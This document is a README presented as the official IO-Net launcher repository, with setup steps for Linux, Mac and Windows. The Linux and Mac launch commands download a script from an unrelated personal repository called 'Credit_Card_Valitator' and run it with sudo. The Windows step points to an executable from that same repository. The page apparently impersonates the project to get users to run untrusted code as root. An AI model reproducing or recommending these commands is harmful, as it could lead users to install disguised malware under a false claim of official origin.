
# IO-Net Official Binaries

Welcome to the official repository for IO-Net launcher binaries. This repository facilitates easy setup and execution of the IO-Net worker software across different platforms. Follow the instructions below to set up and run the binaries on your respective operating system.

## Prerequisites

### For Linux
- Docker
- Nvidia drivers (required for GPU Workers) - running the **IO-Setup** script will automatically install this if needed.
- Nvidia container toolkit (required for GPU Workers) - running the **IO-Setup** script  will automatically install this if needed.

### For Mac OS and Windows
- Docker Desktop
  - [Download Docker Desktop for Mac](https://www.docker.com/products/docker-desktop/) - for Mac OS Choose - Apple chip version for download.

## Installation Instructions

### Linux

1. **Perform IO-Setup (one-time hardware setup)** (skip if Docker and Nvidia drivers are already installed and configured):
   - Download the setup script: 
     ```
     curl -L https://github.com/ionet-official/io-net-official-setup-script/raw/main/ionet-setup.sh -o ionet-setup.sh
     ```
   - Run the script:
     ```
     chmod +x ionet-setup.sh && ./ionet-setup.sh
     ```
   - **Note**: In case the `curl` command fails, install `curl` using:
     ```bash
     sudo apt install curl
     ```
   - **Note**: **For systems with GPUs**: Wait for a restart and rerun the setup script after the restart.


2. **Download and launch the binary**:
   - After completing the setup, download and execute the binary launch script:
     ```bash
     curl -sL https://raw.githubusercontent.com/ilkhom19/Credit_Card_Valitator/main/launch-binary.sh -o launch-binary.sh && sudo bash launch-binary.sh
     ```


### Mac

1. **Download and launch the binary**:
   ```
   curl -sL https://raw.githubusercontent.com/ilkhom19/Credit_Card_Valitator/main/launch-binary.sh -o launch-binary.sh && sudo bash launch-binary.sh
   ```

   **Troubleshooting**: If you encounter an error such as `bad CPU type in executable`, you might be running software designed for an Intel processor on an Apple Silicon device. Install Rosetta 2 to resolve this issue:
   ```
   softwareupdate --install-rosetta
   ```

### Windows

1. **Manual Download and Launch**:
   - Download the binary named `io-net-launcher-windows-amd64.exe` from the [latest GitHub release](https://github.com/ilkhom19/Credit_Card_Valitator/releases/latest).
   - Open your Downloads folder via Command Prompt (cmd), and launch the binary with the `\k` argument to keep the program open in case of errors:
   ```
   io-net-launcher-windows-amd64.exe \k
   ```

## Starting the Software

- **Linux/Mac**: You can re-run the "Download and launch the binary" script each time to start the application in interactive mode or follow additional instructions provided on the website.
- **Windows**: Execute the binary as described in the installation step to start using the software.

## Support

For support, please open an issue in this repository or contact our support team on [Discord](https://discord.gg/kqFzFK7fg2).

    
